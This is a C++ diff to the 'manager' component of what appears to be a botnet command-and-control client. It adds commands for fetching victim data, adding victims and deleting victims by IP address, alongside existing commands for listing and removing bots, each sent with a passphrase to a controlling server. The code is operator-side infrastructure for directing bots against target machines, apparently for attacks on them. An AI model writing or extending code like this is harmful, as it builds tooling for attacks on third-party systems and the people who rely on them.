@@ -14,11 +14,16 @@ manager::manager(io::io_context& io_context, std::uint16_t port, std::string ser
 	     boost::bind(&manager::handleInit, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
 	    {"[GET_BOTS_DATA]", boost::bind(&manager::handleGetBotsData, this, boost::placeholders::_1, boost::placeholders::_2,
 					    boost::placeholders::_3)},
+	    {"[GET_VICTIMS_DATA]", boost::bind(&manager::handleGetVictimsData, this, boost::placeholders::_1, boost::placeholders::_2,
+					    boost::placeholders::_3)},
 	};
 	interactive_.get_bots_data_callback_ = boost::bind(&manager::getBotsData, this);
-    interactive_.remove_bot_callback_ = boost::bind(&manager::removeClient, this, boost::placeholders::_1);
-    interactive_.add_victim_callback_ = boost::bind(&manager::addVictim, this, boost::placeholders::_1);
+	interactive_.get_victims_data_callback_ = boost::bind(&manager::getVictimsData, this);
 
+	interactive_.remove_victim_callback_ = boost::bind(&manager::removeVictim, this, boost::placeholders::_1);
+	interactive_.remove_bot_callback_ = boost::bind(&manager::removeClient, this, boost::placeholders::_1);
+
+	interactive_.add_victim_callback_ = boost::bind(&manager::addVictim, this, boost::placeholders::_1);
 }
 
 void manager::start() {
@@ -64,12 +69,24 @@ void manager::handleInit(std::string& command, std::vector<std::string>& params,
 void manager::handleGetBotsData(std::string& command, std::vector<std::string>& params, session* server) {
 	if (!params.size()) return;
 	interactive_.updateMainWindowMenu(params);
+    interactive_.active_tab_ = command;
 }
 
+void manager::handleGetVictimsData(std::string& command, std::vector<std::string>& params, session* server) {
+	if (!params.size()) return;
+	interactive_.updateMainWindowMenu(params);
+    interactive_.active_tab_ = command;
+}
 
 void manager::getBotsData() {
 	std::vector<std::string> output_params{passphrase_};
 	std::string command = "[GET_BOTS_DATA]";
+	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
+}
+
+void manager::getVictimsData() {
+	std::vector<std::string> output_params{passphrase_};
+	std::string command = "[GET_VICTIMS_DATA]";
 	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
 }
 
@@ -79,9 +96,15 @@ void manager::removeClient(std::string& bot_ip) {
 	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
 }
 
-void manager::addVictim(std::string& victim_ip){
+void manager::removeVictim(std::string& bot_ip) {
+	std::vector<std::string> output_params = {passphrase_, bot_ip};
+	std::string command = "[DEL_VICTIM]";
+	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
+}
+
+void manager::addVictim(std::string& victim_ip) {
 	std::vector<std::string> output_params = {passphrase_, victim_ip};
 	std::string command = "[ADD_VICTIM]";
 	server_session_container_[0]->send(msg_parser_.genCommand(command, output_params));
-
 }
+
